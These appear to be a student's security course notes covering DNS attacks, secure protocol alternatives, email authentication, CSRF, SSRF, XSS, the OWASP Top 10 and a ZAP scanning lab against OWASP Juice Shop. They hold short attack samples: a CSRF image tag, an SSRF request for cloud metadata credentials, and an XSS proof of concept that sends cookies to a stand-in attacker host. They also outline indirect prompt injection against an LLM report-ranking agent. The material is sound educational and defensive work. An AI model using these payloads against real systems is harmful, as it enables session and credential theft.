# Chapter 11 — Secure Protocols and Applications

## 11.1 DNS Security

DNS resolves names to addresses. It's also **one of the least monitored and most abused protocols on any network**, because it's allowed outbound almost everywhere and rarely inspected.

### How resolution works

Client → recursive resolver → root servers → TLD servers → authoritative server → answer, cached at each step.

Record types worth knowing: **A** (IPv4), **AAAA** (IPv6), **CNAME** (alias), **MX** (mail), **NS** (nameserver), **TXT** (arbitrary text — used for SPF, DKIM, domain verification), **PTR** (reverse lookup), **SOA** (zone authority).

### Attacks

* **DNS cache poisoning / spoofing** - injecting a false record into a resolver's cache so a correct name resolves to an attacker's address. **Nastier than phishing because the URL is genuinely correct** — the address bar shows exactly what the user expected. The Kaminsky attack (2008) made this practical against most resolvers at the time.
* **DNS hijacking** - compromising the registrar account or nameserver configuration and changing records at the source. Total control of the domain.
* **Domain hijacking** - stealing the domain registration itself.
* **DNS tunnelling** - encoding data inside DNS queries and responses to exfiltrate data or run C2. Works precisely because **DNS is almost always permitted outbound and rarely inspected.** Detectable as abnormally long queries, high query volume to one domain, unusual record types (TXT/NULL), and high entropy in subdomain names.
* **DGA (Domain Generation Algorithm)** - malware generates hundreds of candidate domains daily; the operator registers one. Defeats static blocklists, and shows up as a distinctive burst of NXDOMAIN responses (chapter 6.6).
* **Typosquatting** - `gogle.com`, or homoglyph domains using visually identical characters from other scripts.
* **DNS amplification** - small spoofed query, large response, directed at a victim (chapter 9.3).
* **Zone transfer (AXFR)** - if misconfigured to allow anyone, hands over the entire DNS zone: every hostname, every internal server name. Free reconnaissance. Should be restricted to authorised secondaries only.

### Defences

* **DNSSEC** - cryptographically **signs** DNS records so resolvers can verify authenticity and integrity. Stops cache poisoning. **It does not encrypt** — DNSSEC is about integrity, not confidentiality, and that distinction is commonly muddled.
* **DoH (DNS over HTTPS)** and **DoT (DNS over TLS)** - **encrypt** DNS queries. Provides confidentiality against on-path observers.
  The security tension worth noting: DoH also **hides DNS from your own security monitoring**. A browser using DoH to an external resolver bypasses your DNS filtering and your visibility entirely. So it's a privacy win for users and a monitoring loss for defenders — enterprises typically respond by forcing internal resolvers and blocking known DoH endpoints.
* **DNS filtering** - block resolution of malicious domains. Cheap, effective, network-wide (chapter 7.23).
* **Restrict zone transfers**, disable open recursion, and rate limit responses.
* **Registrar lock** and MFA on the registrar account, since domain hijacking is a registrar-account problem, not a DNS problem.
* **Monitor DNS logs.** Underrated — almost every piece of malware makes a DNS query before it does anything else.

## 11.2 FTP and Packet Capture

### The problem with FTP

**FTP sends credentials and data in cleartext.** Capture the traffic and you have the username, password and file contents, no cracking required.

Capturing an FTP login in Wireshark and reading `USER darsh` / `PASS hunter2` in plain text is the single most convincing demonstration in the whole course. It turns the insecure/secure protocol table from memorisation into something obvious.

```
# display filter
ftp
ftp.request.command == "PASS"
```

FTP also uses two channels — a control channel (21) and a separate data channel (20 active / random port passive) — which makes it awkward for firewalls and NAT, another reason to avoid it.

### The secure alternatives

* **FTPS** - FTP with TLS. Still two channels, still firewall-awkward.
* **SFTP** - file transfer **over SSH**, single connection on port 22. Unrelated to FTP despite the name. Usually the right answer.
* **SCP** - file copy over SSH. Simpler, being superseded by SFTP.
* **HTTPS** - fine for most file transfer needs.

### The insecure → secure table

| Insecure | Port | Secure | Port |
|---|---|---|---|
| FTP | 20/21 | FTPS / **SFTP** | 989-990 / **22** |
| Telnet | 23 | **SSH** | 22 |
| HTTP | 80 | **HTTPS** | 443 |
| SMTP | 25 | SMTPS / STARTTLS | 465 / 587 |
| POP3 | 110 | POP3S | 995 |
| IMAP | 143 | IMAPS | 993 |
| LDAP | 389 | LDAPS | 636 |
| SNMPv1/v2c | 161 | **SNMPv3** | 161 |
| TFTP | 69 | (avoid entirely) | — |
| RSH/rlogin | 514/513 | SSH | 22 |

Also: DNS 53, DHCP 67/68, NTP 123, SMB 445, RDP 3389, Kerberos 88, MySQL 3306, PostgreSQL 5432, RDP 3389.

**The pattern to notice:** every original internet protocol was designed with **no encryption and no authentication**, because the network was small and everyone on it was trusted. Every secure variant is a retrofit. That's the same story as ARP in chapter 7.12 and Modbus in chapter 10.2 — the trust assumption changed and the protocols didn't.

## 11.3 Secure Web and Email

### HTTPS and TLS

TLS provides confidentiality, integrity and server authentication. The handshake is the hybrid model from chapter 7.5 — asymmetric to authenticate and agree a secret, symmetric for the bulk data.

* **TLS 1.2 minimum, 1.3 preferred.** 1.3 removed the legacy weak ciphers, made forward secrecy mandatory, and cut a round trip from the handshake.
* **SSL is dead** — SSLv2 and SSLv3 are broken (POODLE). "SSL certificate" persists as a name; the protocol is TLS.
* **HSTS (HTTP Strict Transport Security)** - a header telling browsers to only ever connect over HTTPS to this domain. **Defeats SSL stripping**, where an on-path attacker downgrades the initial HTTP request before the redirect to HTTPS ever happens. HSTS preloading bakes it into the browser so even the first visit is protected.
* **Certificate validation** — the client must actually check the chain, the hostname against SAN, and expiry. Users clicking through certificate warnings undoes all of it, which is why warnings are deliberately hard to bypass now.

### Security headers

Worth knowing because they're cheap and high-value:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'      # the strongest anti-XSS control
X-Content-Type-Options: nosniff                  # stop MIME sniffing
X-Frame-Options: DENY                            # anti-clickjacking
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=()
```

### Cookie security

```
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict; Path=/
```

* **Secure** - only sent over HTTPS.
* **HttpOnly** - **JavaScript cannot read it.** This is what limits the damage of XSS, since a stolen session cookie is usually the goal.
* **SameSite** - controls sending on cross-site requests. **This is the primary structural defence against CSRF** (11.4).

### Email security

Email has no authentication by design — SMTP lets anyone claim to be anyone. Three DNS-based mechanisms retrofit it:

* **SPF (Sender Policy Framework)** - a TXT record listing which servers may send for this domain. Receivers check the sending IP against it. **Breaks on forwarding**, since the forwarder isn't in the list.
* **DKIM (DomainKeys Identified Mail)** - the sending server **cryptographically signs** the message; the public key is published in DNS. Proves the message wasn't altered and came from the domain. Survives forwarding.
* **DMARC** - ties the two together: it specifies **alignment** (the visible From: domain must match the SPF/DKIM domain), a **policy** (none / quarantine / reject) for failures, and **reporting** back to the domain owner.

**All three are needed.** SPF and DKIM alone don't stop **display-name spoofing** — an attacker sends from their own domain with the display name "Darsh Thakur", passing SPF and DKIM for *their* domain. DMARC alignment is what catches the mismatch, and even then display-name-only spoofing needs user training and external-sender banners.

Also: **S/MIME and PGP** for end-to-end message signing and encryption; secure email gateways with attachment sandboxing and link rewriting; and DLP on outbound mail.

## 11.4 Request Forgery Attacks

### CSRF — Cross-Site Request Forgery

Tricking an **already-authenticated** user's browser into making a request they didn't intend.

The mechanism: the browser automatically attaches cookies for a domain to *any* request to that domain, regardless of what page initiated it. So a malicious page can cause a request to your bank, and the browser helpfully includes the session cookie.

```html
<!-- on attacker.com, while the victim is logged into bank.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

The attacker **never sees the response** — same-origin policy prevents that. They just cause the **action**. So CSRF targets state-changing operations: transfers, password changes, permission grants.

**Defences:**
* **Anti-CSRF tokens** - a random, per-session, unpredictable value in every state-changing form, validated server-side. The attacker can't read it (same-origin policy) so can't include it.
* **SameSite cookies** - `Lax` (the modern browser default) blocks cookies on cross-site POST; `Strict` blocks them on all cross-site requests. This has structurally reduced CSRF a great deal.
* **Re-authentication** for high-value actions.
* **Never use GET for state changes** — the `<img>` example above only works because a state change was reachable via GET.

**The distinction worth holding:** **XSS abuses the site's trust in user input; CSRF abuses the site's trust in the user's browser.** And note XSS defeats CSRF tokens entirely — if an attacker can run JavaScript on your page, they can read the token. So XSS is the more fundamental problem.

### SSRF — Server-Side Request Forgery

Making the **server** issue requests on the attacker's behalf.

```
POST /fetch-image
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The server has network access the attacker doesn't — internal services, admin panels, databases, and critically **cloud metadata endpoints** (`169.254.169.254`) which hand out IAM credentials. SSRF against a cloud instance frequently escalates straight to cloud account compromise. This was the mechanism in the Capital One breach.

**Defences:** allow-list permitted destinations rather than deny-listing (deny-lists get bypassed with DNS rebinding, redirects, alternate IP encodings, IPv6), block link-local and private ranges, require IMDSv2 (which requires a session token and blocks the simple SSRF path), network-segment the service, and don't return the raw response to the user.

## 11.5 Cross-Site Scripting

Injecting JavaScript that executes in **another user's browser**, in the context of your trusted site.

### Types

* **Stored (persistent)** - the payload is saved server-side (a comment, a profile field) and served to **everyone** who views it. Highest impact.
* **Reflected** - the payload is in the request and echoed back in the response. Requires getting the victim to click a crafted link.
* **DOM-based** - happens entirely client-side; the payload never reaches the server, because vulnerable JavaScript reads from `location.hash` or similar and writes it into the DOM. **Server-side filtering cannot see it at all.**

### Impact

Session cookie theft, credential harvesting via injected forms, keylogging, defacement, forced actions as the victim, redirects, and **bypassing CSRF protections** (as above).

```javascript
// classic proof of concept
<script>fetch('https://attacker/'+document.cookie)</script>

// what real payloads look like — obfuscated, no <script> tag
<img src=x onerror="...">
<svg onload="...">
```

### Defences, in order of strength

1. **Context-aware output encoding.** The real fix. Encode data at the point of output, correctly for its context — HTML body, HTML attribute, JavaScript, URL, and CSS each need different encoding. Encoding for the wrong context still leaves you vulnerable.
2. **CSP (Content Security Policy)** - restricts where scripts may load from and can block inline script entirely. **The strongest defence in depth**, because it limits the damage even when an injection succeeds.
3. **HttpOnly cookies** - so stolen-cookie XSS stops working.
4. **Framework auto-escaping** - React, Angular and modern templating escape by default. Most XSS in modern apps comes from deliberately bypassing that (`dangerouslySetInnerHTML`, `v-html`, `innerHTML`).
5. **Input validation** - useful, and **not sufficient alone**, because the same input may be safe in one context and dangerous in another.

**Sanitisation is a blacklist and blacklists lose.** Encoding is the structural fix, exactly like parameterised queries versus escaping for SQLi.

## 11.6 Web Application Security

### Input validation

The foundational principle: **all input is untrusted.** Not just form fields — headers, cookies, URL parameters, file uploads, API payloads, and data from other systems.

* **Allow-list over deny-list.** Define what's valid and reject everything else. Deny-lists are permanently incomplete.
* **Validate server-side.** Client-side validation is a usability feature; it's trivially bypassed with a proxy, so it is not a control.
* Validate type, length, format, range.
* **Canonicalise before validating**, or encoding tricks slip past (`..%2f`, double encoding, Unicode normalisation).

### Session management

* Generate session IDs with a CSPRNG, long enough to be unguessable.
* **Regenerate the session ID on privilege change**, especially at login — otherwise **session fixation** works, where an attacker sets a known session ID before the victim logs in and then reuses it.
* Idle and absolute timeouts.
* Invalidate server-side on logout, not just client-side.
* Secure, HttpOnly, SameSite cookies.

### Authentication and authorization

* Never store passwords with a fast hash (chapter 2.4).
* **Authorize every request server-side.** The most common real-world failure is checking permission when rendering the UI and not when handling the API call — the attacker doesn't use your UI.
* Prevent user enumeration: identical responses and timing for "user doesn't exist" and "wrong password".
* Rate limit authentication endpoints.

### Error handling and logging

Generic errors to the user, detailed ones to the log. Stack traces exposing file paths, library versions and SQL structure are free reconnaissance. Log security events; **never log credentials, tokens or session IDs** — which is the same rule I wrote into the Claude usage notifier README, since the session cookie there is functionally a password and must never end up in a log or a pasted GitHub issue.

### Secure SDLC

Requirements → threat modelling (STRIDE) → secure design → secure coding standards → code review → SAST/DAST/SCA in CI → pentest → secure deployment → monitoring.

**Shift left** — finding a flaw in design costs a fraction of finding it in production. And **dependency management**, since most of a modern application is third-party code (chapter 7.20).

## 11.7 OWASP Top 10

The 2021 list. Not a checklist so much as the industry's shared vocabulary for what actually goes wrong.

**A01 — Broken Access Control.** Moved to number one. Users acting outside intended permissions: IDOR (changing an ID in a URL to reach someone else's record), missing function-level authorization, privilege escalation, CORS misconfiguration. *Fix:* deny by default, enforce server-side on every request, never trust client-supplied identifiers.

**A02 — Cryptographic Failures.** Previously "Sensitive Data Exposure". Weak or missing crypto: cleartext transmission, weak algorithms, hardcoded keys, poor key management, fast password hashes. *Fix:* TLS everywhere, AES-GCM, Argon2/bcrypt for passwords, proper key management.

**A03 — Injection.** SQLi, command injection, LDAP injection, and **XSS is now classified here**. *Fix:* parameterised queries, safe APIs, context-aware output encoding.

**A04 — Insecure Design.** New in 2021, and conceptually important: **flaws in the design itself, which no amount of correct implementation fixes.** A password reset flow using guessable security questions is perfectly implemented and fundamentally broken. *Fix:* threat modelling, secure design patterns, reference architectures.

**A05 — Security Misconfiguration.** Defaults, unnecessary features, open cloud storage, verbose errors, missing hardening, missing security headers. *Fix:* hardened repeatable baselines, minimal installs, automated verification.

**A06 — Vulnerable and Outdated Components.** Known-vulnerable dependencies. *Fix:* SCA, SBOM, patch process, remove unused dependencies.

**A07 — Identification and Authentication Failures.** Credential stuffing tolerance, weak passwords permitted, broken session management, missing MFA. *Fix:* MFA, breach-list checks, proper session handling.

**A08 — Software and Data Integrity Failures.** Unverified updates, insecure deserialization, compromised CI/CD pipelines. **This is where supply chain attacks live** — SolarWinds. *Fix:* signature verification, trusted repositories, pipeline integrity.

**A09 — Security Logging and Monitoring Failures.** Not logging, not alerting, not retaining. **You cannot respond to what you never saw.** *Fix:* log auth events and failures, centralise, alert, test that detection works.

**A10 — Server-Side Request Forgery.** Added by community survey. *Fix:* allow-list destinations, block internal ranges, IMDSv2.

### The OWASP API Top 10

Separate list, because APIs fail differently. The headline one is **BOLA (Broken Object Level Authorization)** — the API equivalent of IDOR and the single most common serious API flaw. Also: broken authentication, excessive data exposure (returning full objects and filtering in the client), lack of rate limiting, mass assignment.

### OWASP Top 10 for LLMs

Increasingly relevant, and directly applicable to my VAPT pipeline: **prompt injection** (direct and indirect), insecure output handling, training data poisoning, model DoS, supply chain vulnerabilities in model weights, sensitive information disclosure, insecure plugin design, **excessive agency**, overreliance, model theft.

The one that matters most for my own project is **indirect prompt injection**, because the pipeline ingests VAPT reports — documents full of attacker-supplied payload strings by definition. A malicious finding could carry text engineered to manipulate the ranking agent into downgrading a critical vulnerability. Keeping the agent stateless and write-less, enforcing structured output, and treating model output as untrusted at the render boundary are the mitigations that follow.

## 11.8 Web Application Vulnerability Scanning

### Tools

* **OWASP ZAP** - free, open source, full-featured. Proxy, spider, active and passive scanning.
* **Burp Suite** - the industry standard. Community edition is free with throttled scanning; Professional adds the full scanner.
* **Nikto** - fast web server misconfiguration scanner.
* **sqlmap** - automated SQL injection detection and exploitation.
* **Nuclei** - template-based scanning, very fast, large community template library.
* **Commercial DAST** - Acunetix, Netsparker, Qualys WAS.

### Passive vs active scanning

* **Passive** - observes traffic without sending anything unusual. Finds missing headers, cookie flags, information disclosure. **Safe to run against production.**
* **Active** - sends crafted malicious payloads. Finds injection, XSS, traversal. **Can create data, delete data, trigger workflows, or take the application down.** Never point it at production without explicit authorisation and a rollback plan.

That distinction is the practical version of the IDS/IPS inline-versus-tap trade from chapter 7.28: observation is safe, interaction is powerful and dangerous.

### Limitations

* **Authentication** - scanners need configuring to log in, or they only ever scan the public surface. A large majority of real vulnerabilities sit behind login.
* **Coverage** - the spider misses JavaScript-heavy SPAs, multi-step workflows, and anything behind complex state.
* **False positives** are common and need manual triage.
* **Business logic flaws are invisible to scanners.** "Can a user apply the same discount code fifty times?" is a logic question no tool understands. That gap is precisely why manual pentesting still exists (chapter 12).

## 11.9 Lab — OWASP ZAP Scan

Against **OWASP Juice Shop**, deliberately vulnerable and made for this. Scanning anything you don't own or have written permission to test is illegal (chapter 5.7).

```bash
# run the target locally
docker run --rm -p 3000:3000 bkimminich/juice-shop

# ZAP baseline scan (passive only — safe)
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t http://localhost:3000 -r report.html

# full active scan (aggressive — lab only)
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py -t http://localhost:3000 -r fullreport.html
```

### Manual workflow in the GUI

1. Configure the browser to proxy through ZAP (127.0.0.1:8080) and install ZAP's CA certificate — which is itself an instructive moment, because **you are deliberately setting up a MITM against yourself**, exactly the mechanism a TLS-inspecting proxy uses (chapter 7.22).
2. Browse the application manually to populate the site tree — manual browsing beats the spider for coverage.
3. Spider and AJAX spider for the rest.
4. Passive scan findings appear automatically.
5. Active scan the in-scope tree.
6. Triage the alerts.

### What the results actually looked like

The baseline passive scan alone flagged missing CSP, missing X-Content-Type-Options, cookies without HttpOnly, and version disclosure in headers — **all findings from chapter 11.3, all fixable by adding response headers, none requiring a code change.** That's a genuinely useful lesson about cost-to-fix ratios.

The active scan found SQL injection and reflected XSS with working proof-of-concept payloads.

### What it didn't find

Juice Shop's more interesting challenges — the broken access control and business logic ones — went undetected. Changing a user ID in an API call to read another user's basket is **A01, the number one item on the OWASP list**, and the scanner walked straight past it because it has no concept of which basket *should* belong to whom.

That's the limitation stated in 11.8 demonstrated concretely: **scanners find pattern-matchable flaws, and the highest-ranked category on the OWASP list is largely not pattern-matchable.** Automated scanning is a floor, not a ceiling.

---

## Chapter 11 — what I'd take away

* DNS is permitted outbound almost everywhere and rarely inspected, which is why tunnelling and DGAs work — and why DNS logs are underrated.
* DNSSEC signs, DoH/DoT encrypt. Different problems, and DoH costs defenders visibility.
* Every legacy protocol was built for a trusted network; every secure variant is a retrofit.
* SPF + DKIM + DMARC are all needed, and even together they don't stop display-name spoofing.
* CSRF abuses trust in the browser; XSS abuses trust in input — and XSS defeats CSRF tokens, so it's the deeper problem.
* SSRF against cloud metadata escalates to account compromise. Allow-list destinations, use IMDSv2.
* Output encoding beats sanitisation; parameterised queries beat escaping. Structure beats filtering, every time.
* Broken access control is #1 on OWASP and largely invisible to scanners — which is the whole argument for manual testing.
